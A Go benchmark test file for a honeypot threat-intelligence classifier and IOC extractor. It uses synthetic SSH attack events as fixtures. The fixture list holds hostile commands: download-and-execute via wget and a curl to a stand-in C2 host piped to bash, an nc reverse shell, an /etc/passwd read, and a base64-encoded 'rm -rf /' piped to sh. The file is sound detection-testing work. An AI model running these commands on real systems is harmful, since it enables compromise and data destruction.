package intelligence

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func benchClassifier(b *testing.B) *Classifier {
	b.Helper()
	loader := NewATTCKLoader(b.TempDir())
	loader.loadEmbedded()
	return NewClassifier(loader, NewTTPBuilder(30*time.Minute))
}

func sampleEvents(n int) []*database.Event {
	cmds := []string{
		"wget http://203.0.113.9/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh; ./x.sh",
		"uname -a; cat /etc/passwd; cat /proc/cpuinfo",
		"curl -s https://c2.attacker.io/stage2 | bash",
		"nc -e /bin/sh 10.0.0.1 4444",
		"echo cm0gLXJmIC8K | base64 -d | sh",
	}
	evs := make([]*database.Event, n)
	for i := range evs {
		evs[i] = &database.Event{
			Timestamp: time.Now(), Honeypot: "cowrie", SourceIP: fmt.Sprintf("198.51.100.%d", i%255),
			Protocol: "ssh", EventType: "command", Username: "root", Password: "123456",
			Command: cmds[i%len(cmds)],
		}
	}
	return evs
}

// BenchmarkClassifySingle measures the per-event classification hot path (runs
// on every event the worker processes).
func BenchmarkClassifySingle(b *testing.B) {
	c := benchClassifier(b)
	ev := sampleEvents(1)[0]
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ev.Classified = false
		_ = c.Classify(ctx, ev)
	}
}

// BenchmarkClassifyBatch500 measures a full worker batch (default batch size).
func BenchmarkClassifyBatch500(b *testing.B) {
	c := benchClassifier(b)
	evs := sampleEvents(500)
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, e := range evs {
			e.Classified = false
		}
		_ = c.ClassifyBatch(ctx, evs)
	}
}

// BenchmarkIOCExtract measures IOC extraction alone on a payload-rich command.
func BenchmarkIOCExtract(b *testing.B) {
	e := NewExtractor()
	ev := sampleEvents(1)[0]
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = e.Extract(ev)
	}
}
